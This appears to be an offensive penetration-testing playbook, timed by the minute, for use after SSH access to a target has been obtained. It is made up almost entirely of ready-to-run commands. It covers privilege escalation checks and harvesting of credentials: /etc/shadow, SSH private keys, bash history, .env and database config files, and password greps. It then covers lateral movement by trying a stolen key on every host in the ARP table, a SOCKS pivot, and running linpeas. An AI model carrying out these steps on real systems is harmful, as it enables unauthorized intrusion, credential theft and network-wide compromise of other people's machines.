# Playbook: SSH Access Obtained

## Minute 0: Connect + Classify

```
[ ] ssh user@target
[ ] sudo -l → SUDO permissions
[ ] id → User/groups
[ ] hostname → Target name
[ ] ip addr → Network interfaces
[ ] uname -a → Kernel version
```

## Minute 5: Immediate Privilege Escalation

```
[ ] sudo -l → ALL? → sudo -i → ROOT
[ ] find / -perm -4000 -type f 2>/dev/null → SUID
[ ] cat /etc/crontab → Cron jobs
[ ] ls -la /etc/cron* → Cron dirs
[ ] cat /etc/passwd | cut -d: -f1,3,7 → Users with shells
[ ] docker ps → Docker group?
```

## Minute 15: Credential Access

```
[ ] cat ~/.bash_history → Commands + creds
[ ] cat ~/.ssh/id_rsa → SSH private key
[ ] cat ~/.ssh/authorized_keys → Auth keys
[ ] cat /etc/shadow → Hashes (if readable)
[ ] cat /etc/hosts → Known hosts
[ ] find / -name ".my.cnf" 2>/dev/null -exec cat {} \;
[ ] find / -name ".env" 2>/dev/null -exec cat {} \;
[ ] grep -r "password\|PASSWORD\|passwd\|credentials" /home/ 2>/dev/null
[ ] grep -r "password\|PASSWORD\|passwd\|credentials" /var/www/ 2>/dev/null
```

## Minute 30: Lateral Movement + Pivot

```
[ ] SSH key sweep on internal hosts:
    for ip in $(arp -a | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'); do
      ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa user@$ip 'whoami' 2>/dev/null;
    done

[ ] SSH tunnel setup:
    ssh -D 1080 -N user@target  # SOCKS proxy
    └── proxychains nmap -sT internal-subnet

[ ] Upload linpeas.sh:
    scp linpeas.sh user@target:/tmp/
    ssh user@target "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"

[ ] Upload pspy:
    └── Check cron timers, process triggers

[ ] If ROOT:
    [ ] Dump /etc/shadow → Crack hashes
    [ ] Collect all SSH keys
    [ ] Collect all DB configs
```

## Milestone Checks
- [ ] sudo ALL? → sudo -i → Root
- [ ] Root access? → Dump all hashes, keys, configs
- [ ] SSH key found? → Test on all hosts
- [ ] Dual-homed? → New subnet, setup pivot
- [ ] DB creds? → Test on MySQL/MSSQL
